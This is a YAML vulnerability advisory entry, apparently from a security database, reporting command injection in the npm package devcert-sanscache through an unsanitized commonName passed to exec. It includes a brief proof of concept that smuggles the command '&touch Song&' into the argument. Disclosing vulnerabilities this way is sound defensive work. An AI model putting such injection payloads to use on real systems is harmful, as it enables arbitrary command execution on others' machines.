---
- id: snykio:npm:devcert-sanscache:540926
  title: Command Injection
  description: |
    [devcert-sanscache][1] is a package that can be used to generate trusted
    local SSL/TLS certificates for local SSL development.

    Affected versions of this package are vulnerable to Command Injection.
    The variable `commonName` controlled by user input is used as part of
    the `exec` function without any sanitization.

    ### PoC by JHU System Security Lab   {#poc-by-jhu-system-security-lab}

        var root = require("devcert-sanscache");
        var attack_code = "&touch Song&";
        root(attack_code);



    [1]: https://www.npmjs.com/package/devcert-sanscache
  affected_package: devcert-sanscache
